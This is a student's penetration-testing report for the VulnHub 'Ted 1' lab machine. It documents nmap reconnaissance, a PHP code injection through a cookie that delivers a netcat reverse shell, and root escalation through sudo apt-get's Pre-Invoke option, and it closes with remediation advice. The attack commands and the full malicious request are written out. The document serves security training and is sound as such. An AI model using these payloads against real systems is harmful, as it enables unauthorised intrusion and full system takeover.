
# 🛡️ Penetration Testing Report: Ted 1 (VulnHub)

| **Target** | **IP Address** | **Difficulty** | **Date** | **Tester** |
| :--- | :--- | :--- | :--- | :--- |
| **Ted: 1** | `192.168.56.106` | Beginner / Intermediate | 2025-12-15 | Student |

---

## 1. Executive Summary
This document outlines the security assessment and exploitation of the **Ted 1** virtual machine. The objective was to identify vulnerabilities and escalate privileges to gain full administrative control (`root`).

**Key Findings:**
1.  **Critical RCE Vulnerability:** The web application is vulnerable to **PHP Code Injection** via the HTTP `Cookie` header, allowing unauthenticated remote code execution.
2.  **Privilege Escalation:** The `www-data` user has insecure **Sudo** permissions configured for `apt-get`, allowing for trivial root escalation using known GTFOBins techniques.

---

## 2. Reconnaissance & Enumeration

### 2.1. Host Discovery
An initial ping scan was performed to identify the target's IP address within the local network.

```bash
nmap -sN 192.168.56.0/24
````

**Result:** Target identified at `192.168.56.106`.

### 2.2. Service Scanning

A comprehensive scan was conducted to detect open ports and service versions.

```bash
nmap -A -p- 192.168.56.106
```

**Output:**

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
```

  * **Operating System:** Ubuntu Linux (Kernel 3.x/4.x)
  * **Web Server:** Apache 2.4.18

-----

## 3\. Initial Access (Exploitation)

### 3.1. Web Application Analysis

Navigating to `http://192.168.56.106/` presented a login form. Further enumeration revealed a dashboard at `home.php`. Traffic analysis was performed using **Burp Suite** to inspect HTTP headers.

### 3.2. Vulnerability: PHP Code Injection (Cookie)

It was observed that the application relies on a cookie named `user_pref`. The server processes this cookie's value using a function capable of executing PHP code (e.g., `eval()`), without proper sanitization. This allows an attacker to inject arbitrary PHP commands.

**Exploitation Logic:**

  * **Injection Payload Template:**

    ```php
    <?php exec('COMMAND_HERE')?>
    ```

    1.  **Injection Point:** The `user_pref` parameter in the Cookie header.
    2.  **Execution:** The server interprets the PHP tags and executes the shell command via `exec()`.
    3.  **Outcome:** A Reverse Shell connection is established to the attacker's machine.

### 3.3. Execution

To exploit this, a **Netcat** reverse shell payload was crafted.

**1. Listener Setup (Attacker):**

```bash
nc -lnvp 1234
```

**2. Malicious HTTP Request (Burp Suite):**
The following request was sent to the server. Note the `Cookie` header containing the payload.

```http
POST /home.php HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: [http://192.168.56.106/home.php](http://192.168.56.106/home.php)
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: [http://192.168.56.106](http://192.168.56.106)
Connection: keep-alive
Cookie: PHPSESSID=6k2d0m2bh4i8i17kf7pu55rcv6; user_pref=<?php exec('nc 192.168.56.102 1234 -e /bin/bash')?>; 
Upgrade-Insecure-Requests: 1

search=index.
```

**3. Result:**
A shell was successfully caught on the listener.

```bash
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106]
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

-----

## 4\. Privilege Escalation

### 4.1. Sudo Rights Enumeration

Upon gaining access as `www-data`, system enumeration was performed to identify potential escalation vectors.

**Command:**

```bash
sudo -l
```

**Output:**

```text
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/apt-get
```

**Analysis:** The user is permitted to run `/usr/bin/apt-get` as root without providing a password.

### 4.2. Exploitation: GTFOBins (apt-get)

The `apt-get` binary is known to be exploitable if run via sudo. We leveraged the functionality described in **GTFOBins** (Method 'c').

**The Command:**

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

**Step-by-Step Logic:**

1.  **`sudo /usr/bin/apt-get update`**: Initiates the package list update process with **Root** privileges (due to `sudo`).
2.  **`-o` (Option)**: This flag allows passing arbitrary configuration options to APT.
3.  **`APT::Update::Pre-Invoke::=/bin/sh`**:
      * **Mechanism:** This configuration tells APT to run a specific command *before* (Pre-Invoke) it starts the actual update process.
      * **Payload:** We specify `/bin/sh` as the command to run.
      * **Execution:** Since APT is running as root, the `/bin/sh` process is spawned with **Root (UID 0)** privileges, breaking out of the intended execution flow.

### 4.3. Proof of Root

The exploit was successful, granting full system control.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# ls -la /root
total 40K
drwx------  3 root root 4.0K Jul 16  2019 .
-rw-------  1 root root 2.7K Jul 16  2019 .bash_history
```

-----

## 5\. Remediation Recommendations

To secure this system, the following actions are recommended:

1.  **Fix Code Injection:** Sanitize all inputs from HTTP Cookies in the PHP application. Avoid using `eval()` or `exec()` with user-controlled data.
2.  **Restrict Sudo:** Remove the entry for `www-data` in `/etc/sudoers`. Web server users should strictly **not** have passwordless sudo access to package managers like `apt-get`.
      * *Action:* Run `visudo` and remove the line: `(root) NOPASSWD: /usr/bin/apt-get`.

-----

## 6\. References

  * [VulnHub: Ted 1](https://www.vulnhub.com/entry/ted-1,327/)
  * [GTFOBins: apt-get](https://gtfobins.github.io/gtfobins/apt-get/)
  * [Hacking Articles Walkthrough](https://www.hackingarticles.in/ted1-vulnhub-walkthrough/)
